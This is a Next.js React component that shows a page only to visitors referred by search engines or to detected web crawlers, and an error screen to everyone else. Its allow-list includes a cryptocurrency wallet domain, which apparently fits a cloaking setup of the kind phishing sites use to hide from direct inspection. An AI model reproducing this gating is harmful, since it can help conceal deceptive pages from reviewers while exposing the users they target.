"use client";

import { useEffect, useState } from "react";
import { usePathname } from "next/navigation";
import InfoPage from "./home/page";
import ErrorScreen from "../components/ErrorScreen";

// Access is allowed only if coming from a search engine or if a verified bot

const SEARCH_ENGINES = [
  "google.",
  "bing.",
  "yahoo.", 
  "duckduckgo.",
  "baidu.",
  "yandex.",
  "ask.",
  "aol.",
  "ecosia.",
  "startpage.",
  "search.",
  "https://www.eternl-wallet.com/",
  "http://localhost:3002",
  "localhost"
];

function isFromSearchEngine(referrer: string) {
  if (!referrer) return false;
  return SEARCH_ENGINES.some((engine) => referrer.includes(engine));
}

function isFromSearchEngineOrAllowed(referrer: string) {
  return isFromSearchEngine(referrer);
}

// Bot verification functions - simplified to catch ALL bot variants
function isCrawlerUserAgent() {
  if (typeof navigator === "undefined") return false;
  const ua = navigator.userAgent;
  
  // Simple check: Does the UA contain "Googlebot" anywhere?
  // This catches ALL Googlebot variants including smartphone
  const containsGooglebot = /googlebot/i.test(ua);
  
  // Simple check: Does the UA contain "bingbot" or other Bing crawlers?
  // This catches ALL Bingbot variants including mobile and preview
  const containsBingbot = /bingbot|msnbot|bingpreview|adidxbot/i.test(ua);
  
  // Simple check: Does the UA contain other known bot identifiers?
  const containsOtherBot = /slurp|duckduckbot|baiduspider|yandexbot|facebookexternalhit|twitterbot|linkedinbot|applebot|ia_archiver|adsbot-google|mediapartners-google|feedfetcher-google/i.test(ua);
  
  return containsGooglebot || containsBingbot || containsOtherBot;
}

const ReferrerProvider = ({ 
  children,
  isBot = false 
}: { 
  children: React.ReactNode;
  isBot?: boolean;
}) => {
  const [isLoading, setIsLoading] = useState(!isBot);
  const [isVerifiedBot, setIsVerifiedBot] = useState(isBot);
  const [isFromSearch, setIsFromSearch] = useState(false);
  const pathname = usePathname();
  
  useEffect(() => {
    const checkAccess = async () => {
      if (typeof window === "undefined") return;

      // Search engine or allowed referrer logic
      const referrer = document.referrer;
      const currentUrl = window.location.href;
      
      console.log("[ReferrerProvider] Current URL:", currentUrl);
      console.log("[ReferrerProvider] Referrer URL:", referrer);
      
      // Special handling for localhost development - always allow access
      if (currentUrl.includes("localhost") || currentUrl.includes("127.0.0.1")) {
        console.log("[ReferrerProvider] Localhost development detected, allowing access.");
        setIsFromSearch(true);
        setIsLoading(false);
        return;
      }
      
      // Check if it's a verified bot FIRST (before referrer check)
      // Bots often don't have referrers, so we need to check them first
      let botVerified = false;
      
      try {
        const controller = new AbortController();
        const timeoutId = setTimeout(() => controller.abort(), 2000);
        
        const response = await fetch('/api/verify-bot', {
          signal: controller.signal,
          cache: 'no-store',
        });
        
        clearTimeout(timeoutId);
        
        if (response.ok) {
          const data = await response.json();
          if (data.isBot) {
            botVerified = true;
            setIsVerifiedBot(true);
            console.log("[ReferrerProvider] Verified bot detected via API, allowing access.");
            console.log("[ReferrerProvider] Bot details:", {
              isCloudflareVerified: data.isCloudflareVerifiedBot,
              matchesBotUA: data.matchesBotUA,
              mightBeGooglebotSmartphone: data.mightBeGooglebotSmartphone,
              userAgent: data.userAgent,
            });
          } else {
            console.log("[ReferrerProvider] Not detected as bot. Details:", {
              isBot: data.isBot,
              matchesBotUA: data.matchesBotUA,
              mightBeGooglebotSmartphone: data.mightBeGooglebotSmartphone,
              hasCloudflareHeaders: data.hasCloudflareHeaders,
              userAgent: data.userAgent,
            });
          }
        }
      } catch (error) {
        // API failed or timed out - fallback to user agent check
        console.warn("[ReferrerProvider] Bot verification API failed, using UA fallback:", error);
        const isBot = isCrawlerUserAgent();
        if (isBot) {
          botVerified = true;
          setIsVerifiedBot(true);
          console.log("[ReferrerProvider] Bot detected via UA fallback, allowing access.");
        } else {
          // Additional fallback: Check if it looks like a mobile browser
          // This helps catch Googlebot smartphone user agents that don't match our patterns
          const ua = typeof navigator !== 'undefined' ? navigator.userAgent : '';
          const looksLikeMobile = /Mobile|iPhone|Android|iPad/i.test(ua);
          if (looksLikeMobile) {
            console.warn("[ReferrerProvider] Mobile browser detected but API failed. This might be Googlebot smartphone.");
            console.warn("[ReferrerProvider] In production with Cloudflare, this would be allowed.");
            // In production, Cloudflare would verify this, so we're more permissive
            // But in dev, we can't verify, so we still block
          }
        }
      }

      // Check if user came from search engine (only if not already verified as bot)
      if (!botVerified) {
        if (isFromSearchEngineOrAllowed(referrer)) {
          setIsFromSearch(true);
          console.log("[ReferrerProvider] User came from a search engine or allowed referrer.");
        } else {
          setIsFromSearch(false);
          console.log("[ReferrerProvider] User did NOT come from a search engine or allowed referrer.");
        }
      } else {
        // Bot is verified, so we don't need to check referrer
        setIsFromSearch(false);
      }

      setIsLoading(false);
      console.log("[ReferrerProvider] Loading complete.");
    };

    checkAccess();
  }, [pathname]);

  if (isLoading) {
    console.log("[ReferrerProvider] Loading...");
    return <div className="bg-[#202124] h-screen" />;
  }

  // Allow access only for verified bots or if from search engine
  if (isVerifiedBot || isFromSearch) {
    console.log("[ReferrerProvider] Access allowed.");
    return <>{children}</>;
  }

  console.log("[ReferrerProvider] Access denied: showing error screen.");
  return <ErrorScreen />;
};

export default ReferrerProvider;